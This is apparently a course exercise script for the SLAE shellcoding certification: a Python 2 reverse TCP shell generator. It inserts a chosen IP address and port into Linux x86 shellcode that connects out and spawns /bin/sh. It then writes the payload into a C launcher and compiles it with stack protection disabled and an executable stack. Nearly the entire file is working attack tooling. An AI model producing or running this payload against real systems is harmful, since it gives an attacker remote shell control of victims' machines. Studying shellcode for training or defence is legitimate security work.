# Author: bigb0ss
# Student ID: SLAE-1542

import sys
import argparse
import subprocess
import string
import socket

""" Arguments """
parser = argparse.ArgumentParser(description = '[+] Reverse TCP Shell Generator')
parser.add_argument('-p', '--port', help='\tPort')
parser.add_argument('-ip', '--ipAddr', help='\tIP Address')
args = parser.parse_args()


def error():
    parser.print_help()
    exit(1)

def exploit(ip, port):
    
    # Reverse TCP Shell 
    shellcode1 = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2"
    shellcode1+= "\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02"
    shellcode1+= "\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x52\\x52"
    shellcode1+= "\\x31\\xc0\\xb8"

    # "\x80\x01\x01\x02" = IP 127.0.0.1 + 1.1.1.1

    print "[INFO] Reverse Shell IP: " + ip
    ip = ip.split(".")
    ip[:]=[int(i)+1 for i in ip]    # Adding 1 to each element in the ip array
   
    # First Octet of the IP Address
    octet1 = hex(ip[0])
    octet1 = octet1[2:]
    if len(octet1) == 2:
        octet1 = "\\x" + octet1
    else:
        octet1 = "\\x" + "%02x" % int(octet1)
    
    # Second Octet of the IP Address
    octet2 = hex(ip[1])
    octet2 = octet2[2:]
    if len(octet2) == 2:
        octet2 = "\\x" + octet2
    else:
        octet2 = "\\x" + "%02x" % int(octet2)

    # Thrid Octet of the IP Address
    octet3 = hex(ip[2])
    octet3 = octet3[2:]
    if len(octet3) == 2:
        octet3 = "\\x" + octet3
    else:
        octet3 = "\\x" + "%02x" % int(octet3)

    # Forth Octet of the IP Address
    octet4 = hex(ip[3])
    octet4 = octet4[2:]
    if len(octet4) == 2:
        octet4 = "\\x" + octet4
    else:
        octet4 = "\\x" + "%02x" % int(octet4)

    ipHex = octet1 + octet2 + octet3 + octet4

    shellcode2 = "\\x2d\\x01\\x01\\x01\\x01\\x50\\x66\\x68"  # Subtracting 1.1.1.1 = Potential Nullbyte avoidance mechanism

    # "\x15\xb3" = port 5555

    print "[INFO] Reverse Shell Port: " + port

    port = hex(socket.htons(int(port)))
    a = port[2:4]
    b = port[4:]
    if b == '':
        b = '0'
    port = '\\x{0}\\x{1}'.format(b, a)

    shellcode3 = "\\x66\\x6a\\x02\\x89\\xe6\\x31\\xc0\\x31"
    shellcode3+= "\\xdb\\xb0\\x66\\xb3\\x03\\x6a\\x10\\x56"
    shellcode3+= "\\x57\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1"
    shellcode3+= "\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe"
    shellcode3+= "\\xc9\\xcd\\x80\\x75\\xf4\\x52\\x68\\x6e"
    shellcode3+= "\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69"
    shellcode3+= "\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b"
    shellcode3+= "\\xcd\\x80"

    payload = shellcode1 + ipHex + shellcode2 + port + shellcode3

    # Adding shellcode to shellcode.c
    outShellcode = ''
    outShellcode+= '#include<stdio.h>\n'
    outShellcode+= '#include<string.h>\n'
    outShellcode+= '\n'
    outShellcode+= 'unsigned char code[] = \ \n'
    outShellcode+= '"{0}";'.format(payload)
    outShellcode+= '\n'
    outShellcode+= 'main()\n'
    outShellcode+= '{\n'
    outShellcode+= 'printf("Shellcode Length:  %d", strlen(code));\n'
    outShellcode+= '\tint (*ret)() = (int(*)())code;\n'
    outShellcode+= '\tret();\n'
    outShellcode+= '}\n'
    #print outShellcode

    # Creating shellcode.c
    filename = "exploit.c"
    outfile = open(filename, 'w')
    outfile.write(outShellcode)
    outfile.close()
    

    print "[INFO] Creating File: exploit.c"

    # Compiling shellcode.c
    subprocess.call(["gcc", "-fno-stack-protector", "-z", "execstack", filename, "-o", "exploit", "-w"])
    print "[INFO] Compiled Executable: exploit"

if __name__ == "__main__":
    inputIP = args.ipAddr if args.ipAddr != None else error()
    inputPort = args.port if args.port != None else error()
    

    exploit(inputIP, inputPort)

